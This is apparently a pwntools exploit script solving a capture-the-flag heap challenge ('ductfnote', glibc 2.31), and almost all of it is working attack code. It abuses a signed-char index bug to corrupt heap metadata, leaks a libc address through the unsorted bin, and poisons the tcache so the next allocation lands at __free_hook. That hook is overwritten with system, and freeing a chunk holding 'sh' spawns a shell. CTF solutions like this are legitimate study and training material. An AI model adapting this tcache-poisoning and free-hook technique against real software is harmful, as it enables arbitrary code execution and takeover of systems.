#!/usr/bin/env python3

from pwn import *

elf = ELF("./ductfnote_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    global r
    if args.REMOTE:
        r = remote()
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b show_note
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r

def alloc(size: int):
    r.sendlineafter(b'>> ', b'1')
    r.sendlineafter(b'Size: ', str(size).encode())

def free():
    r.sendlineafter(b'>> ', b'4')

def show() -> bytes:
    r.sendlineafter(b'>> ', b'2')
    r.recvuntil(b'<------------ NOTE 1 ------------>\n')
    return r.recvuntil(b'<-------------------------------->\n', drop=True).strip()

def edit(data: bytes):
    r.sendafter(b'>> ', b'3\n'+data)

def main():
    r = conn()

    # the vuln is that in edit_note the idx variable is a signed char

    # overwrite maxsize in the heap and current chunk's size
    alloc(0x7f)
    edit(b'a'*0x80 + b'b'*0x54+p64(0x21)+p32(0xffffffff) + b'c'*0x14 + p16(0x111) + b'\n')
    free()

    # this (X) will be put into the unsorted bin
    alloc(0x180)
    edit(b'a'*0xf4 + p16(0x110) + b'\n')
    free()

    # fill tcache size for 0x190
    for _ in range(7):
        alloc(0x80)
        edit(b'a'*0xf4 + p16(0x191) + b'\n')
        free()

    # this is allocated where X was located
    alloc(0x7f)
    edit(b'a'*0xec + p64(0x110) + p16(0x191) + b'\n')
    free() # X gets put into the unsorted bins

    # the memory isn't cleaned after malloc, alloc the chunk from unsorted bin and leak libc
    alloc(0x80)
    libc.address = u64(show()[4:12]) - 0x1ebd60
    log.success(f"Libc base: {hex(libc.address)}")
    log.info(f"Free hook at {hex(libc.sym.__free_hook)}")

    # put something into tcache 0x390
    alloc(0x380)
    free()

    # poison tcache struct for 0x390 with __free_hook
    alloc(0x7f)
    edit(b'a'*0x84+p64(libc.sym.__free_hook-0x10) + b'\n')

    # overwrite __free_hook with system
    alloc(0x380)
    edit(b'\x00'*0xc + p64(libc.sym.system) + b'\n')

    from Crypto.Util.number import bytes_to_long

    # call sh
    alloc(bytes_to_long(b"hs"))
    free()

    r.interactive()


if __name__ == "__main__":
    main()
